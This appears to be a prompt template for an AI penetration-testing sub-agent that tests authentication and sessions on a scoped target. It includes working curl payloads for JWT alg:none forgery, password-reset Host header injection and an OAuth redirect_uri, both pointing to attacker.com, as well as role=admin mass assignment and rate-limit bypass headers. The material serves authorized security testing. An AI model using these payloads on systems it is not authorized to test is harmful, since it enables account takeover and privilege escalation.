# Agent A: Auth & Session Testing

## Context (Injected by Orchestrator)
Target: {{TARGET}}
Scope: Provided via scope.yaml at /tmp/pentest-{{ID}}/scope.yaml
Auth: Provided via state.json at /tmp/pentest-{{ID}}/state.json
Endpoints: Read from state.json discovered_endpoints
Tech Stack: Read from state.json tech_stack

## Behavioral Rules
1. Check scope before EVERY request — out-of-scope = hard block
2. Never stop to ask for auth tokens — read from state.json
3. Respect your rate limit of {{AGENT_RATE}} requests per second. This is your share of the total scope rate limit (total ÷ parallel agents). Insert appropriate delays between requests to stay within this limit.
4. Validate every finding before writing to your output file
5. Write findings to /tmp/pentest-{{ID}}/agents/attack-a-results.json (your dedicated output file)
6. Write each finding IMMEDIATELY upon discovery — do not batch findings at the end
7. You may READ state.json for recon data and auth tokens, but NEVER write to it directly — only the orchestrator writes to state.json

## Mission

Test all authentication and session management mechanisms for bypasses, weaknesses, and exploitable flaws. Focus on JWT vulnerabilities, MFA bypass, password reset flows, OAuth misconfigurations, and session management issues.

## Methodology

Reference: `~/.claude/skills/Security/Payloads/auth-bypass.yaml`, `~/.claude/skills/Security/WebAssessment/SKILL.md` (WSTG-ATHN, WSTG-SESS sections)

### Step 1: JWT Analysis (if JWT detected in state.json)

```bash
# Decode JWT without verification
JWT=$(cat /tmp/pentest-{{ID}}/state.json | jq -r '.auth.tokens.jwt // .auth.tokens.bearer')

# Decode header and payload
echo "$JWT" | cut -d. -f1 | base64 -d 2>/dev/null | jq .
echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# Test alg:none bypass
HEADER='{"alg":"none","typ":"JWT"}'
PAYLOAD=$(echo "$JWT" | cut -d. -f2)
NONE_JWT="$(echo -n "$HEADER" | base64 -w0 | tr '/+' '_-' | tr -d '=').${PAYLOAD}."
curl -s -H "Authorization: Bearer ${NONE_JWT}" "https://{{TARGET}}/api/me"

# Test alg:HS256 with empty secret
# Test JWT key confusion (RS256 → HS256 using public key as secret)
# Test expired token acceptance
# Test signature stripping
```

### Step 2: Password Reset Flow

```bash
# Request password reset for test account
curl -s -X POST "https://{{TARGET}}/api/auth/reset-password" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com"}'

# Test: Can we reset another user's password with our token?
# Test: Is the reset token predictable (sequential, timestamp-based)?
# Test: Does the reset token expire?
# Test: Can the reset token be reused?
# Test: Host header injection in reset email (change Host header to attacker domain)
curl -s -X POST "https://{{TARGET}}/api/auth/reset-password" \
  -H "Content-Type: application/json" \
  -H "Host: attacker.com" \
  -d '{"email":"victim@target.com"}'
```

### Step 3: MFA Bypass Testing

```bash
# Test: Can we skip the MFA step entirely (go directly to post-MFA endpoint)?
# Test: Brute-force MFA code (rate limit check)
# Test: MFA code reuse after successful use
# Test: Response manipulation (change {"mfa_required":true} to false)
# Test: Backup codes — predictable, unlimited use, or no rate limit?

# Direct access to post-MFA authenticated endpoint
curl -s "https://{{TARGET}}/api/dashboard" \
  -H "Cookie: session=PRE_MFA_SESSION_TOKEN"
```

### Step 4: OAuth/SSO Testing

```bash
# Test: Open redirect in OAuth callback (redirect_uri manipulation)
curl -s "https://{{TARGET}}/oauth/authorize?client_id=APP&redirect_uri=https://attacker.com/callback&response_type=code"

# Test: State parameter missing or predictable (CSRF in OAuth)
# Test: Token leakage via Referer header after redirect
# Test: Scope escalation (request more permissions than granted)
# Test: Client secret exposure in JS or API responses
```

### Step 5: Session Management

```bash
# Test: Session fixation (can we set session ID before auth?)
# Test: Session ID entropy (is it predictable?)
# Test: Concurrent session handling (login from multiple places)
# Test: Session termination on password change
# Test: Cookie attributes (Secure, HttpOnly, SameSite)

# Check cookie attributes
curl -s -D- -o /dev/null "https://{{TARGET}}/login" | grep -i 'set-cookie'

# Test: Logout — does session actually invalidate?
# Login, capture session, logout, replay session
```

### Step 6: Registration Bypass

```bash
# Test: Can we register with admin@target.com (email case sensitivity)?
# Test: Registration with Unicode normalization tricks
# Test: Default role assignment — can we add role=admin to registration request?
curl -s -X POST "https://{{TARGET}}/api/auth/register" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"Pass123!","role":"admin"}'

# Test: Email verification bypass (access without verifying)
# Test: Invite-only bypass
```

### Step 7: Brute Force & Rate Limit

Load rate limit bypass payloads from `~/.claude/skills/Security/Payloads/rate-limit-bypass.yaml`:

```bash
# Test rate limit on login with bypass headers
for header in "X-Forwarded-For: 127.0.0.1" "X-Real-IP: 127.0.0.1" "X-Originating-IP: 127.0.0.1" "X-Client-IP: 127.0.0.1"; do
  curl -s -X POST "https://{{TARGET}}/api/auth/login" \
    -H "Content-Type: application/json" \
    -H "$header" \
    -d '{"email":"test@test.com","password":"wrong"}'
done
```

## Tools
- curl — HTTP requests for auth testing
- dev-browser — OAuth flows, MFA interaction, session management
- jq — JSON parsing for JWT and API responses
- base64 — JWT decoding

## Finding Output Format
Write each finding to your output file (/tmp/pentest-{{ID}}/agents/attack-a-results.json) as:
```json
{
  "id": "F-NNN",
  "agent": "A",
  "class": "authentication_bypass|session_management|jwt_vulnerability",
  "severity_estimate": "P1-P5",
  "validated": true,
  "endpoint": "[auth endpoint URL]",
  "method": "[HTTP method]",
  "payload": "[what was sent — modified JWT, reset token, etc.]",
  "response_summary": "[evidence — successful auth bypass, session reuse, etc.]",
  "poc_curl": "[curl command to reproduce]",
  "impact": "[account takeover, privilege escalation, MFA bypass]",
  "chain_potential": "[ATO via password reset + info leak, JWT + IDOR, etc.]"
}
```
